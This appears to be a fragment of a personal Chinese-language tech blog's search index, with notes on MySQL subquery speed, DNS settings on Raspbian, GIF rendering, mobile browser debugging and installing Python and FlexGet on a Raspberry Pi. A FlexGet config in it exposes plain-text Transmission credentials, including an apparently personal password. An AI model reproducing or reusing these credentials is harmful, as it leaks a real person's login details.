JOIN<br><code>first_big_table</code> stm<br>ON stm.playlistID  = p.playlistID<br>WHERE stm.playlistID  = p.playlistID</p>\n<p>用這種解法，速度有變比較快<br>但這種寫法真的不時直覺…</p>\n<h2 id=\"結論\"><a href=\"#結論\" class=\"headerlink\" title=\"結論\"></a>結論</h2><p>網路上查，好像MySQL到5.7和8.0效能上有很大的改進<br>希望我有機會能使用到…</p>\n<p>參考來源:</p>\n<ul>\n<li><a href=\"http://wangyuanzju.blog.163.com/blog/static/13029200691114035831/\" target=\"_blank\" rel=\"noopener\">MySQL特异功能之：Impossible WHERE noticed after reading const tables - 风轻扬的日志 - 网易博客</a></li>\n<li><a href=\"http://budairenqin.iteye.com/blog/1754937\" target=\"_blank\" rel=\"noopener\">MySql Explain 的使用[转] - 不待人亲 - ITeye博客</a></li>\n<li><a href=\"https://my.oschina.net/lxrm/blog/108309\" target=\"_blank\" rel=\"noopener\">MySQL EXPLAIN：Impossible WHERE noticed after re… - NILYANG</a></li>\n<li><a href=\"https://stackoverflow.com/questions/3417074/why-would-an-in-condition-be-slower-than-in-sql/3417190#3417190\" target=\"_blank\" rel=\"noopener\">mysql - Why would an IN condition be slower than “=” in sql? - Stack Overflow</a></li>\n<li><a href=\"https://stackoverflow.com/questions/3416076/this-select-query-takes-180-seconds-to-finish\" target=\"_blank\" rel=\"noopener\">sql - This SELECT query takes 180 seconds to finish - Stack Overflow</a></li>\n<li><a href=\"https://stackoverflow.com/questions/5018284/mysql-in-queries-terribly-slow-with-subquery-but-fast-with-explicit-values\" target=\"_blank\" rel=\"noopener\">query optimization - MySQL “IN” queries terribly slow with subquery but fast with explicit values - Stack Overflow</a></li>\n<li><a href=\"http://www.cnblogs.com/zhengyun_ustc/p/slowquery3.html\" target=\"_blank\" rel=\"noopener\">[慢查优化]慎用MySQL子查询，尤其是看到DEPENDENT SUBQUERY标记时 - 旁观者 - 博客园</a></li>\n<li><a href=\"http://codingstandards.iteye.com/blog/1344833\" target=\"_blank\" rel=\"noopener\">MySQL性能优化小记：MySQL子查询很慢的问题 - Bash @ Linux - ITeye博客</a></li>\n<li><a href=\"http://www.cnblogs.com/zhengyun_ustc/p/slowquery3.html\" target=\"_blank\" rel=\"noopener\">[慢查优化]慎用MySQL子查询，尤其是看到DEPENDENT SUBQUERY标记时 - 旁观者 - 博客园</a></li>\n<li>高性能mysql第三版 P.223</li>\n</ul>\n","categories":["SQL"],"tags":["MySQL","IN","效能"]},{"title":"在Raspbain設定DNS","url":"/blog/2018/04/19/%E5%9C%A8Raspbain%E8%A8%AD%E5%AE%9ADCHP%E6%99%82%E5%BE%8CDNS/","content":"<p>今天在鳥哥看到</p>\n<blockquote>\n<p>例題：<br>我的主機使用 DHCP 取得 IP ，很奇怪的，當我修改過 /etc/resolv.conf 之後，隔不多久這個檔案又會恢復成原本的樣子，這是什麼原因？ 該如何處理？<br>答：<br>因為使用 DHCP 時，系統會主動的使用 DHCP 伺服器傳來的資料進行系統設定檔的修訂。因此，你必須告知系統，不要使用 DHCP 傳來的伺服器設定值。 此時，你得要在 /etc/sysconfig/network-scripts/ifcfg-eth0 等相關檔案內，增加一行：『PEERDNS=no』，然後重新啟動網路即可。<br>此外，如果你有啟動 CentOS 6.x 的 NetworkManager 服務，有時候也可能會產生一些奇特的現象哩！所以鳥哥是建議關掉它的！^_^ </p>\n</blockquote>\n<p><a href=\"http://linux.vbird.org/linux_server/0350dns.php#DNS_resolver_file\" target=\"_blank\" rel=\"noopener\">鳥哥的 Linux 私房菜 – DNS Server</a></p>\n<p>很久之前我有寫過類似的問題<br>不過後來是用crontab來重覆寫這個問題<br>今天有看到一個方法</p>\n<a id=\"more\"></a>\n<blockquote>\n<p>由於我用的是ubuntu, 沒有fedora的/etc/sysconfig/network-scripts/ifcfg-eth0 設定檔. 但是, 可以修改/etc/dhcp3/dhclient.conf來達到同樣的目的:</p>\n</blockquote>\n<blockquote>\n<p>$ sudo nano /etc/dhcp3/dhclient.conf<br>加入:<br>supersede domain-name-servers 168.95.1.1, 8.8.8.8;<br>supersede domain-name “domain1.com domain2.com”;</p>\n</blockquote>\n<blockquote>\n<p>應該是跨發佈系統的.</p>\n</blockquote>\n<p><a href=\"https://ithelp.ithome.com.tw/articles/10071258\" target=\"_blank\" rel=\"noopener\">Linux DHCP DNS設定問題 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></p>\n<p>目前沒有試過這個東西</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">supersede domain-name-servers 8.8.8.8, 8.8.4.4;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://welkinchen.pixnet.net/blog/post/5456817-ubuntu-dns-%E8%A8%AD%E5%AE%9A\" target=\"_blank\" rel=\"noopener\">Ubuntu DNS 設定 @ Welkin小窩 :: 痞客邦 ::</a><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">prepend domain-name-servers 8.8.8.8;</span><br></pre></td></tr></table></figure></p>\n<p>不過動物機還是不管用，但很多人好像都成功了<br>不知道為什麼</p>\n<p><a href=\"https://askubuntu.com/questions/63160/how-to-override-the-dhcp-provided-nameserver\" target=\"_blank\" rel=\"noopener\">networking - How to override the DHCP-provided nameserver? - Ask Ubuntu</a><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">A resolution that will resolve your problem is to configure your resolvconf package. This will give precedence to your preferred nameservers as well as any other desired settings resolv.conf settings such as search and domain preferences.</span><br><span class=\"line\"></span><br><span class=\"line\">Edit the file: /etc/resolvconf/resolv.conf.d/head</span><br><span class=\"line\"></span><br><span class=\"line\">Place your desired nameservers and any other configurations you want to take preference when there is a network change there. When any changes to the network happen, the configuration there will always take precedence.</span><br><span class=\"line\"></span><br><span class=\"line\">An example of the /etc/resolvconf/resolv.conf.d/head file:</span><br><span class=\"line\"></span><br><span class=\"line\"># Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)</span><br><span class=\"line\">#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN</span><br><span class=\"line\"></span><br><span class=\"line\">nameserver 8.8.8.8</span><br><span class=\"line\">search mydomain.com</span><br></pre></td></tr></table></figure></p>\n<p>安裝resolvconf</p>\n<p>照head設定dns<br>竟然成功了<br>先記錄</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">nameserver 8.8.8.8</span><br><span class=\"line\">nameserver 192.168.1.1</span><br></pre></td></tr></table></figure>\n<p>不過之前中華DNS好像有問題<br>最近又不會了…<br>可能正式機不會動</p>\n<p>參考來源：<br><a href=\"http://linux.vbird.org/linux_server/0350dns.php#DNS_resolver_file\" target=\"_blank\" rel=\"noopener\">鳥哥的 Linux 私房菜 – DNS Server</a><br><a href=\"https://ithelp.ithome.com.tw/articles/10071258\" target=\"_blank\" rel=\"noopener\">Linux DHCP DNS設定問題 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a><br><a href=\"http://welkinchen.pixnet.net/blog/post/5456817-ubuntu-dns-%E8%A8%AD%E5%AE%9A\" target=\"_blank\" rel=\"noopener\">Ubuntu DNS 設定 @ Welkin小窩 :: 痞客邦 ::</a><br><a href=\"https://zhuanlan.zhihu.com/p/34027883\" target=\"_blank\" rel=\"noopener\">VPC DHCP类型的ECS修改DNS</a><br><a href=\"https://askubuntu.com/questions/63160/how-to-override-the-dhcp-provided-nameserver\" target=\"_blank\" rel=\"noopener\">networking - How to override the DHCP-provided nameserver? - Ask Ubuntu</a></p>\n","categories":["Linux"],"tags":["Linux","Raspberry PI","DNS DHCP","resolvconf","Ubuntu"]},{"title":"在display-none情況下GIF不會被render","url":"/blog/2018/04/25/%E5%9C%A8display-none%E6%83%85%E6%B3%81%E4%B8%8BGIF%E4%B8%8D%E6%9C%83%E8%A2%ABrender/","content":"<p>今天看到了gif在<code>display:block</code> 竟然動畫才開始動<br>查了一下下，原來這跟render有關係<br>在此做一下筆記…</p>\n<a id=\"more\"></a>\n<blockquote>\n<p>“display:none” is Your Friend<br>If you use display:none on the GIF’s html <img> tag, the GIF will not be rendered at all, and will not use any CPU or GPU resources. See this and this for explanations.<br><a href=\"https://stackoverflow.com/questions/33762652/does-hiding-an-animated-gif-with-css-conserve-browser-resources\" target=\"_blank\" rel=\"noopener\">html - Does hiding an animated GIF with CSS conserve browser resources? - Stack Overflow</a></p>\n</blockquote>\n<blockquote>\n<p>display:none; elements are not in the render tree all, so they will perform better at face value.<br><a href=\"https://stackoverflow.com/a/11757103\" target=\"_blank\" rel=\"noopener\">https://stackoverflow.com/a/11757103</a><br><a href=\"https://www.html5rocks.com/en/tutorials/internals/howbrowserswork/#Render_tree_construction\" target=\"_blank\" rel=\"noopener\">How Browsers Work: Behind the scenes of modern web browsers - HTML5 Rocks</a><br><a href=\"https://ithelp.ithome.com.tw/articles/10195447?sc=iThelpR\" target=\"_blank\" rel=\"noopener\">前端新手村 都市傳說之隱藏元素的手法 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></p>\n</blockquote>\n<p>有在<a href=\"https://stackoverflow.com/questions/10730212/proper-way-to-reset-a-gif-animation-with-displaynone-on-chrome\" target=\"_blank\" rel=\"noopener\">javascript - Proper way to reset a GIF animation with display:none on Chrome - Stack Overflow</a><br>看到使用<a href=\"http://jsfiddle.net/ult_combo/F8Q44/3/\" target=\"_blank\" rel=\"noopener\">JSFiddle</a>Firefox,IE都會重置<br>但是CHROME不會…<br>有在裡面文章找到解法<a href=\"https://stackoverflow.com/a/21104927\" target=\"_blank\" rel=\"noopener\">https://stackoverflow.com/a/21104927</a><br><a href=\"http://jsfiddle.net/F8Q44/19/\" target=\"_blank\" rel=\"noopener\">http://jsfiddle.net/F8Q44/19/</a><br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">$(<span class=\"string\">'img'</span>).show().each(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.offsetHeight;</span><br><span class=\"line\">&#125;).prop(<span class=\"string\">'src'</span>, <span class=\"string\">'image src'</span>);</span><br></pre></td></tr></table></figure></p>\n<p>這個問題好像是我之前寫的render問題解決方法…<br><a href=\"http://malagege.logdown.com/posts/1731337-javascript-web-page-rendering-rendering-pipline\" target=\"_blank\" rel=\"noopener\">[JavaScript] 網頁渲染的過程 (rendering pipline) « 進擊的程式新手</a></p>\n<p>常使用<code>prop</code>用在checked上面，不過今天看到這個用法<br>查看了一下官網文件</p>\n<blockquote>\n<p>It should be used when setting selectedIndex, tagName, nodeName, nodeType, ownerDocument, defaultChecked, or defaultSelected. Since jQuery 1.6, these properties can no longer be set with the .attr() method. They do not have corresponding attributes and are only properties.</p>\n</blockquote>\n<p>有些以前沒辦法控制selectedIndex, tagName, nodeName, nodeType, ownerDocument, defaultChecked, or defaultSelected.這些東西<br>不過現在jQuery可以用prop抓到資訊</p>\n<p><a href=\"https://stackoverflow.com/questions/19932965/jquery-propdefaultselected-seems-to-malfunction-in-ie9\" target=\"_blank\" rel=\"noopener\">javascript - jquery .prop(‘defaultSelected’) seems to malfunction in IE9 - Stack Overflow</a></p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"checkbox\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">checked</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"reset\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"test\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><input> elements of type “reset”  are rendered as buttons, with a default click event handler that resets all of the inputs in the form to their <strong>initial values</strong>.<br>很多網站教清空表單<br>但其實正確要說還原表單預設值<br>(怎麼會寫到這個，因為玩到checkbox,defaultSelected就突然想到reset問題，結果不出所料)</p>\n</blockquote>\n<p>結論沒事還是不要用gif做倒數計時…</p>\n","categories":["CSS"],"tags":["CSS","HTML","gif","display","render","image"]},{"title":"在手機上Firefox &Chrome 電腦除錯方法","url":"/blog/2018/10/08/%E5%9C%A8%E6%89%8B%E6%A9%9F%E4%B8%8AFirefox-Chrome-%E9%9B%BB%E8%85%A6%E9%99%A4%E9%8C%AF%E6%96%B9%E6%B3%95/","content":"<p>最近公司遇到在Line上面開網頁<br>會空白頁面…(或正常頁面倒到那一台主機不會有跳頁)<br>被收到需要做手機上的Debug<br>當然之前有做過<br>不過來記錄一次記錄<br>因為不常做XD</p>\n<a id=\"more\"></a>\n<h3 id=\"安裝-google-adb-driver\"><a href=\"#安裝-google-adb-driver\" class=\"headerlink\" title=\"安裝 google adb driver\"></a>安裝 google adb driver</h3><p>原本想安裝自家的Driver<br>不知道win7 x64好像不能用<br>後來選擇google adb driver<br><a href=\"http://tw.miui.com/thread-24838-1-1.html\" target=\"_blank\" rel=\"noopener\">小米5 ADB Interface 驅動程式安裝方式 - 小米手機5 - MIUI官方論壇</a><br><a href=\"https://developer.android.com/studio/run/win-usb\" target=\"_blank\" rel=\"noopener\">Get the Google USB Driver  |  Android Developers</a></p>\n<p>由於有找到<a href=\"http://blog.ctrlxctrlv.net/adroid-google-usb-driver/\" target=\"_blank\" rel=\"noopener\">[Android] Windows 安裝 Google 萬用 USB 驅動程式 | 熱血剪貼部</a>詳細文章(<a href=\"/blog/2018/10/08/在手機上Firefox-Chrome-電腦除錯方法/1.jpg\" title=\"備份圖\">備份圖</a>)<br>所以就沒花費這一塊做筆記了</p>\n<h3 id=\"Firefox安裝-Adb-helper\"><a href=\"#Firefox安裝-Adb-helper\" class=\"headerlink\" title=\"Firefox安裝 Adb helper\"></a>Firefox安裝 Adb helper</h3><p><a href=\"https://ftp.mozilla.org/pub/labs/fxos-simulator/\" target=\"_blank\" rel=\"noopener\">WebIDE Add-ons</a></p>\n<h4 id=\"開啟-WebIde\"><a href=\"#開啟-WebIde\" class=\"headerlink\" title=\"開啟 WebIde\"></a>開啟 WebIde</h4><p>由上角正常可以看到手機名稱</p>\n<p>(圖片待補)</p>\n<p>手機點選<code>允許</code><br><img src=\"/blog/2018/10/08/在手機上Firefox-Chrome-電腦除錯方法/2.jpg\" title=\"Android上的Firefox\"></p>\n<p>就可以看console</p>\n<h3 id=\"Chrome-除錯模式\"><a href=\"#Chrome-除錯模式\" class=\"headerlink\" title=\"Chrome 除錯模式\"></a>Chrome 除錯模式</h3><p><a href=\"https://developers.google.com/web/tools/chrome-devtools/remote-debugging/?utm_source=dcc&amp;utm_medium=redirect&amp;utm_campaign=2016q3\" target=\"_blank\" rel=\"noopener\">遠程調試 Android 設備使用入門  |  Tools for Web Developers  |  Google Developers</a></p>\n<img src=\"/blog/2018/10/08/在手機上Firefox-Chrome-電腦除錯方法/3.png\" title=\"選單功能位置\">\n<p>設定跟功能上比Firefox多<br>設定步驟更簡單，可以直接看到網頁圖示</p>\n<p>最後憑證的問題還是不清楚為什麼orz</p>\n","categories":["實用工具"],"tags":["Firefox","Chrome"]},{"title":"在樹梅派安裝 flexget","url":"/blog/2020/08/11/%E5%9C%A8%E6%A8%B9%E6%A2%85%E6%B4%BE%E5%AE%89%E8%A3%9D-flexget/","content":"<p>在樹梅派安裝 flexget<br>通常要裝 python 3.5以上<br><a href=\"https://malagege.github.io/blog/2018/01/07/logdown/2018-01-07-4726929/\">更新系統flexget壞掉啦!! | 程式狂想筆記</a><br>雖然這篇有小記<br>但最近我看官方安裝方法有點不太一樣<br>這邊小記安裝紀錄</p>\n<a id=\"more\"></a>\n<h2 id=\"安裝-flexget\"><a href=\"#安裝-flexget\" class=\"headerlink\" title=\"安裝 flexget\"></a>安裝 flexget</h2><h3 id=\"安裝-Pytnon-3-8\"><a href=\"#安裝-Pytnon-3-8\" class=\"headerlink\" title=\"安裝 Pytnon 3.8\"></a>安裝 Pytnon 3.8</h3><p>apt 無法取得<br>所以需要手動編譯 Python<br><a href=\"https://installvirtual.com/how-to-install-python-3-8-on-raspberry-pi-raspbian/\" target=\"_blank\" rel=\"noopener\">How to install Python 3.8 on Raspberry Pi (Raspbian) - installvirtual</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt-get update</span><br><span class=\"line\"></span><br><span class=\"line\">sudo apt-get install -y build-essential tk-dev libncurses5-dev libncursesw5-dev libreadline6-dev libdb5.3-dev libgdbm-dev libsqlite3-dev libssl-dev libbz2-dev libexpat1-dev liblzma-dev zlib1g-dev libffi-dev tar wget vim</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 下載 Python</span></span><br><span class=\"line\">wget https://www.python.org/ftp/python/3.8.0/Python-3.8.0.tgz</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安裝 Python</span></span><br><span class=\"line\"><span class=\"comment\"># 這過程會很久，我使用 PI 1 ，安裝大概快一整天才好，建議使用 tmux 安裝，以免關掉需要重來</span></span><br><span class=\"line\">sudo tar zxf Python-3.8.0.tgz</span><br><span class=\"line\"><span class=\"built_in\">cd</span> Python-3.8.0</span><br><span class=\"line\">sudo ./configure --<span class=\"built_in\">enable</span>-optimizations</span><br><span class=\"line\">sudo make -j 4</span><br><span class=\"line\">sudo make altinstall</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 檢查</span></span><br><span class=\"line\">python3.8 -V</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 修改 default 3.8 ，也可以不用做，直接輸入 python3.8</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"alias python=/usr/local/bin/python3.8\"</span> &gt;&gt; ~/.bashrc</span><br><span class=\"line\"><span class=\"built_in\">source</span> ~/.bashrc</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># clean</span></span><br><span class=\"line\">sudo rm -rf Python-3.8.0.tgz</span><br><span class=\"line\">sudo rm -rf Python-3.8.0</span><br></pre></td></tr></table></figure>\n<h3 id=\"另外一種安裝-Python\"><a href=\"#另外一種安裝-Python\" class=\"headerlink\" title=\"另外一種安裝 Python\"></a>另外一種安裝 Python</h3><p>發現有另外一種方式安裝 Python 3.8<br><a href=\"https://installvirtual.com/install-python-3-8-1-on-raspberry-pi-raspbian/\" target=\"_blank\" rel=\"noopener\">Install Python 3.8.1 on Raspberry Pi (Raspbian) - installvirtual</a><br>已經安裝過了<br>我就不測試這個方法<br>但下次可能會試試看</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># apt </span></span><br><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get install -y build-essential tk-dev libncurses5-dev libncursesw5-dev libreadline6-dev libdb5.3-dev libgdbm-dev libsqlite3-dev libssl-dev libbz2-dev libexpat1-dev liblzma-dev zlib1g-dev libffi-dev tar wget vim</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># pyenv</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/pyenv/pyenv.git ~/.pyenv</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">'export PYENV_ROOT=\"$HOME/.pyenv\"'</span> &gt;&gt; ~/.bashrc &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">'export PATH=\"$PYENV_ROOT/bin:$PATH\"'</span> &gt;&gt; ~/.bashrc</span><br><span class=\"line\"><span class=\"built_in\">source</span> ~/.bashrc</span><br><span class=\"line\">pyenv install 3.8.1</span><br><span class=\"line\">pyenv versions</span><br></pre></td></tr></table></figure>\n<p>方法感覺更簡單</p>\n<h3 id=\"安裝-flexget-1\"><a href=\"#安裝-flexget-1\" class=\"headerlink\" title=\"安裝 flexget\"></a>安裝 flexget</h3><p>參考<a href=\"https://flexget.com/InstallWizard/Linux\" target=\"_blank\" rel=\"noopener\">FlexGet</a>這篇<br>使用 virtualenv 還滿有趣的<br>記錄一下</p>\n<blockquote>\n<p>Supported versions of Python:<br>   3.6, 3.7<br>   3.8 (untested, but should work)</p>\n</blockquote>\n<p>官方建議安裝版本<br>不過我沒注意安裝 3.8<br>但是測試可以執行</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># virtualenv</span></span><br><span class=\"line\">python3 -m venv ~/.flexget/   <span class=\"comment\"># 推薦大家改.flexget 因為這樣設定 service 比較不會麻煩</span></span><br><span class=\"line\"><span class=\"comment\"># Install FlexGet in the virtualenv</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> ~/.flexget/</span><br><span class=\"line\">bin/pip install flexget</span><br><span class=\"line\"><span class=\"comment\"># Running FlexGet from the virtualenv</span></span><br><span class=\"line\"><span class=\"built_in\">source</span> ~/.flexget/bin/activate</span><br><span class=\"line\"><span class=\"comment\"># flexget</span></span><br><span class=\"line\">~/.flexget/bin/flexget [options]</span><br><span class=\"line\"><span class=\"comment\"># 全局安裝</span></span><br><span class=\"line\"><span class=\"comment\"># sudo pip install flexget</span></span><br></pre></td></tr></table></figure>\n<p>config.yml 要先設定在 flexget 資料夾才能這常執行</p>\n<p><strong>安裝 transmissionrpc</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">~/flexget/bin/pip3 install  transmissionrpc</span><br><span class=\"line\"><span class=\"comment\"># 假如跑出錯誤Transmissionrpc module version 0.11 or higher required</span></span><br><span class=\"line\"><span class=\"comment\"># 就是少了安裝這個</span></span><br></pre></td></tr></table></figure>\n<p><del>最下面有比較潮的設定</del><br>docker 後來有對 config 做調整<br><figure class=\"highlight yml\"><figcaption><span>config.yml</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">web_server:</span> <span class=\"literal\">yes</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">templates:</span></span><br><span class=\"line\"><span class=\"attr\">  default:</span></span><br><span class=\"line\"><span class=\"attr\">    transmission:</span></span><br><span class=\"line\"><span class=\"attr\">      host:</span> <span class=\"number\">192.168</span><span class=\"number\">.1</span><span class=\"number\">.203</span></span><br><span class=\"line\"><span class=\"attr\">      port:</span> <span class=\"number\">9091</span></span><br><span class=\"line\"><span class=\"attr\">      username:</span> <span class=\"string\">admin</span></span><br><span class=\"line\"><span class=\"attr\">      password:</span> <span class=\"string\">userpwd</span></span><br><span class=\"line\"><span class=\"attr\">      add_paused:</span> <span class=\"literal\">no</span></span><br><span class=\"line\"><span class=\"attr\">      path:</span> <span class=\"string\">/mnt/extHDD/Download/Mikata/201901/&#123;&#123;task&#125;&#125;</span></span><br><span class=\"line\"><span class=\"attr\">    free_space:</span></span><br><span class=\"line\"><span class=\"attr\">      path:</span> <span class=\"string\">/mnt/extHDD/</span></span><br><span class=\"line\"><span class=\"attr\">      space:</span> <span class=\"number\">1000</span></span><br><span class=\"line\"><span class=\"attr\">    clean_transmission:</span></span><br><span class=\"line\"><span class=\"attr\">      host:</span> <span class=\"string\">localhost</span></span><br><span class=\"line\"><span class=\"attr\">      port:</span> <span class=\"number\">9091</span></span><br><span class=\"line\"><span class=\"attr\">      username:</span> <span class=\"string\">admin</span></span><br><span class=\"line\"><span class=\"attr\">      password:</span> <span class=\"string\">userpwd</span></span><br><span class=\"line\"><span class=\"attr\">      finished_for:</span> <span class=\"number\">4</span> <span class=\"string\">days</span></span><br><span class=\"line\"><span class=\"attr\">      min_ratio:</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"attr\">    if:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"'季度全集' in category\"</span><span class=\"string\">:</span> <span class=\"string\">reject</span></span><br><span class=\"line\"><span class=\"attr\">  olddownload:</span></span><br><span class=\"line\"><span class=\"attr\">    transmission:</span></span><br><span class=\"line\"><span class=\"attr\">      host:</span> <span class=\"number\">192.168</span><span class=\"number\">.1</span><span class=\"number\">.203</span></span><br><span class=\"line\"><span class=\"attr\">      port:</span> <span class=\"number\">9091</span></span><br><span class=\"line\"><span class=\"attr\">      username:</span> <span class=\"string\">malagege</span></span><br><span class=\"line\"><span class=\"attr\">      password:</span> <span class=\"string\">malagegeinnfu</span></span><br><span class=\"line\"><span class=\"attr\">      add_paused:</span> <span class=\"literal\">no</span></span><br><span class=\"line\"><span class=\"attr\">      path:</span> <span class=\"string\">/mnt/extHDD/Download/Mikata/201810/&#123;&#123;task&#125;&#125;</span></span><br><span class=\"line\"><span class=\"attr\">    free_space:</span></span><br><span class=\"line\"><span class=\"attr\">      path:</span> <span class=\"string\">/mnt/extHDD/</span></span><br><span class=\"line\"><span class=\"attr\">      space:</span> <span class=\"number\">1000</span></span><br><span class=\"line\"><span class=\"attr\">    clean_transmission:</span></span><br><span class=\"line\"><span class=\"attr\">      host:</span> <span class=\"string\">localhost</span></span><br><span class=\"line\"><span class=\"attr\">      port:</span> <span class=\"number\">9091</span></span><br><span class=\"line\"><span class=\"attr\">      username:</span> <span class=\"string\">admin</span></span><br><span class=\"line\"><span class=\"attr\">      password:</span> <span class=\"string\">admin</span></span><br><span class=\"line\"><span class=\"attr\">      finished_for:</span> <span class=\"number\">4</span> <span class=\"string\">days</span></span><br><span class=\"line\"><span class=\"attr\">      min_ratio:</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"attr\">    if:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"'季度全集' in category\"</span><span class=\"string\">:</span> <span class=\"string\">reject</span></span><br><span class=\"line\"><span class=\"attr\">  autoPass:</span></span><br><span class=\"line\"><span class=\"attr\">    transmission:</span></span><br><span class=\"line\"><span class=\"attr\">      host:</span> <span class=\"number\">192.168</span><span class=\"number\">.1</span><span class=\"number\">.203</span></span><br><span class=\"line\"><span class=\"attr\">      port:</span> <span class=\"number\">9091</span></span><br><span class=\"line\"><span class=\"attr\">      username:</span> <span class=\"string\">admin</span></span><br><span class=\"line\"><span class=\"attr\">      password:</span> <span class=\"string\">admin</span></span><br><span class=\"line\"><span class=\"attr\">      add_paused:</span> <span class=\"literal\">yes</span></span><br><span class=\"line\"><span class=\"attr\">      path:</span> <span class=\"string\">/mnt/extHDD/Download/Mikata/201810/&#123;&#123;task&#125;&#125;</span></span><br><span class=\"line\"><span class=\"attr\">    if:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"'季度全集' in category\"</span><span class=\"string\">:</span> <span class=\"string\">reject</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">tasks:</span></span><br><span class=\"line\">  <span class=\"string\">刀劍神域</span> <span class=\"attr\">Alicization:</span></span><br><span class=\"line\"><span class=\"attr\">    rss:</span></span><br><span class=\"line\"><span class=\"attr\">      url:</span> <span class=\"attr\">https://share.dmhy.org/topics/rss/sort_id/2/rss.xml?keyword=刀劍神域</span> <span class=\"string\">Alicization+悠哈璃羽字幕社＆拉斯观测组+CHT</span></span><br><span class=\"line\"><span class=\"attr\">      other_fields:</span> <span class=\"string\">[category]</span></span><br><span class=\"line\"><span class=\"attr\">    accept_all:</span> <span class=\"literal\">yes</span></span><br><span class=\"line\"><span class=\"attr\">    template:</span> <span class=\"string\">autoPass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">schedules:</span></span><br><span class=\"line\">  <span class=\"comment\"># Run every 30 minutes on monday</span></span><br><span class=\"line\"><span class=\"attr\">  - tasks:</span> <span class=\"string\">\"*\"</span></span><br><span class=\"line\"><span class=\"attr\">    schedule:</span></span><br><span class=\"line\"><span class=\"attr\">      hour:</span> <span class=\"string\">\"*/3\"</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"執行-WebUI-介面\"><a href=\"#執行-WebUI-介面\" class=\"headerlink\" title=\"執行 WebUI 介面\"></a>執行 WebUI 介面</h3><p><a href=\"https://flexget.com/Web-UI\" target=\"_blank\" rel=\"noopener\">FlexGet</a><br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 設定 web 密碼，切記要很嚴謹密碼</span></span><br><span class=\"line\">flexget web passwd &lt;some_password&gt;</span><br><span class=\"line\"><span class=\"comment\"># 背景執行程式</span></span><br><span class=\"line\">flexget daemon start --daemonize</span><br></pre></td></tr></table></figure></p>\n<p>WebUI config 可線上修改config.yml 而且還有除錯功能!!非常簡單!!</p>\n<p><a href=\"http://ip:5050\" target=\"_blank\" rel=\"noopener\">http://ip:5050</a><br>user:flexget<br>pwd: (自己設定)</p>\n<p>這邊 task 需要執行成功一次後<br>才會出現!!!</p>\n<p>注意這邊控制 flexget<br>需要再 flexget 資料夾路徑<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> ~/flexget</span><br><span class=\"line\">~/flexget/bin/flexget daemon stop</span><br><span class=\"line\">~/flexget/bin/flexget daemon start --daemon</span><br><span class=\"line\"><span class=\"comment\"># 2020-08-11 22:10:37 CRITICAL manager                       Failed to find configuration file config.yml</span></span><br><span class=\"line\"><span class=\"comment\"># 2020-08-11 22:10:37 INFO     manager                       Tried to read from: /home/pi, /home/pi/.flexget, /home/pi/.config/flexget</span></span><br></pre></td></tr></table></figure></p>\n<h2 